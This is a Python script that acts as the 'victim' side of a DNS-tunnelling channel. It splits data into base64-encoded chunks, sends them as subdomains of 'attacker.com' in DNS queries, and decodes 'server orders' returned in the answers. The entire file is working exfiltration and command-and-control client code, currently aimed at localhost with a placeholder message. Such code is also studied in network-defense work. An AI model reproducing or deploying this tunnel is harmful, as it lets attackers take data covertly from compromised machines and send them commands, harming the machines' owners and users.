import dns.query
import base64

# DNS Server IP and Port
SERVER_IP = "127.0.0.1"
SERVER_PORT = 4444  # which must be 53 in a real authoritative server.

# DNS Buffer Limitation
SIZE_LIMIT = 36

# number of the data sent to the server till now
counter = None
COUNTER_ADDRESS = './counter.txt'

server_orders = {}  # messages that server has sent to victim in ascii format till now
server_orders_decoded = {}  # messages that server has sent to victim in string format till now

client_messages = {}  # messages that has been sent from the victim to the server till now


def set_counter():
    """
    reads the file and set the counter.
    """
    global counter

    # read counter from file
    with open(COUNTER_ADDRESS, "r") as f:
        content = f.readlines()
        f.close()
    counter = int(content[0])


def make_decision():
    """
    make decision in order to specify what to send to the server.
    :return: message from the victim to be sent to the server.
    """
    return "this is ANOTHER data that we want to send to our server"


def interact():
    global counter
    set_counter()

    # data to be sent to the server.
    raw_data = make_decision()
    client_messages[counter] = raw_data     # save it to a list

    formatted_data = make_well_formatted_data(raw_data)

    for data in formatted_data:
        # send request and get the response
        response = send_dns_request(data)

        # interact with server based on response answer
        check_response(response, data)

    counter += 1
    # save counter to file
    with open(COUNTER_ADDRESS, "w") as f:
        f.write(str(counter))
        f.close()

    print(client_messages)
    print(server_orders_decoded)


def make_well_formatted_data(raw_data):
    """
    :param raw_data: string formatted data to be processed.
    :return: list of well formatted data chunks to be transferred to the server.
    """
    raw_data_list = []
    base64_data_list = []

    # Convert data into smaller packets
    bound = int(len(raw_data) / (SIZE_LIMIT / 2)) + 1
    for i in range(bound):
        element = str(counter) + '_' + str(i) + '_' + raw_data[
                                                      int(i * SIZE_LIMIT / 2): int(i * SIZE_LIMIT / 2 + SIZE_LIMIT / 2)]
        # show the server that no more messages is coming.
        if i == bound - 1:  # last element to be sent
            element += '___'  # if the message includes three underlines at the end then it means our message is finished.

        raw_data_list.append(element)

        # Converting data to base64 dns friendly format.
        data_base64 = convert_to_base64(element)
        base64_data_list.append(data_base64)

    return base64_data_list


def decode_server_orders(index):
    """
    decode the data received from the server to readable string.
    :param index: message id
    """
    server_orders_decoded[index] = ''
    for chunk in server_orders[index]:
        for i in range(1, 4):
            server_orders_decoded[index] += chr(int(server_orders[index][chunk][i]))


def check_response(response, data_to_send):
    """
    checks the response, makes decision in order to response.
    :param response: response from the server.
    :param data_to_send: data that has been sent to the server.
    """

    # making the protocol reliable
    while response is None:  # resend the query.
        response = send_dns_request(data_to_send)

    if str(response).find("NXDOMAIN") == -1:  # server is making orders.
        server_chunk_index = 0
        server_order = str(response.answer).split(' ')[5][2:-4].split('.')
        if counter not in server_orders:
            json = {server_chunk_index: server_order}
            while int(server_order[0]) == 255:  # server wants to send more data
                server_chunk_index += 1
                res = send_dns_request(convert_to_base64(
                    str(server_chunk_index)))  # make a junk request so that server can use the dns tunnel to interact with victim.
                server_order = str(res.answer).split(' ')[5][2:-4].split('.')
                json[server_chunk_index] = server_order
            server_orders[counter] = json

        decode_server_orders(counter)


def convert_to_base64(data):
    """
    :param data: message to be converted to base64 format.
    :return: base64 format of the message
    """
    data_bytes = data.encode("ascii")
    data_base64_bytes = base64.b64encode(data_bytes)
    data_base64_string = data_base64_bytes.decode("ascii")
    return data_base64_string


def send_dns_request(data):
    """
    :param data: data to be sent over dns protocol.
    :return: response of the dns query.
    """
    query_name = data + ".attacker.com"
    message = dns.message.make_query(query_name, "A")
    response = dns.query.udp(message, SERVER_IP, 50, SERVER_PORT)

    return response


interact()
